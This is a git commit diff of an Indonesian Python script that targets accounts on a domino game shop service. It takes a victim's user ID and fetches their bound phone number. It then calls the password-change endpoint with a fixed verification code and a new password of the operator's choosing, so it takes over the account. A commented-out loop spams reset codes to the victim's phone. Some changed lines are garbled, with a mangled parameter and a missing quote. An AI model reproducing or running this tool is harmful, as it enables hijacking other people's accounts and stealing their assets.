577dbbe86866a1d811e470fca697cee1b4032af4
hamsir-anci <77294120+hamsir-anci@users.noreply.github.com>
2021-03-02 12:19:06 -0800

    Update newfile.py

--- newfile.py
+++ newfile.py
@@ -10,9 +10,9 @@ def slowprint(kata):
 if __name__ == '__main__':
 	os.system('clear')
 	userid = input("Masukkan ID Target: ")
-	response = requests.get('https://topbos.com/shop/getUserInfo.do?userId='+userid)
+	response = requests.get('https://idomino.boxiangyx.com/web/shopIndex.do?userId='+userid)
 	log = response.json()
-	nama = requests.get('https://www.topbos.com/web/infullRequest.do?userId='+userid+'&costKey=com.neptune.domino.coincard0035&infullType=4&version=1.63')
+	nama = requests.get('https://idomino.boxiangyx.com/web/shopIndex.do?userId='+userid+'&costKey=com.neptune.domino.sha256WithRSAEncryption =4&version=1.63')
 	nick = nama.json()
 	slowprint('Proses Login Ke Akun '+str(nick['message']['nickName']))
 	if log['message'][5:7] == '08':
@@ -20,11 +20,11 @@ if __name__ == '__main__':
 		slowprint('Login Berhasil')
 		print(nomor)
 		newpas = input('Masukkan Password Baru: ')
-		response2 = requests.get('https://topbos.com/shop/changePwdIndex.do?userId='+userid+'&bindPhone='+nomor+'&code=3247&secondPwd='+newpas+'&sendCodeFlag=0')
+		response2 = requests.get('https://idomino.boxiangyx.com/web/shop/changePwdIndex.do?userId='+userid+'&preBindPhone='+nomor+'&code=3247&secondPwd='+newpas+'&sendCodeFlag=0')
 		log2 = response2.json()
 		if log2['code'] == '0':
 			#for i in range(0,3):
-				#response3 = requests.get('https://topbos.com/shop/sendPwdCodeIndex.do?userId='+userid+'&bindPhone='+nomor)
+				#response3 = requests.get(https://idomino.boxiangyx.com/web/shopIndex/sendPwdCodeIndex.do?userId='+userid+'&bindPhone='+nomor)
 				#slowprint('Proses Spam Ke : '+str(i))
 			slowprint('Password Berhasil Di Ganti')
 		else:
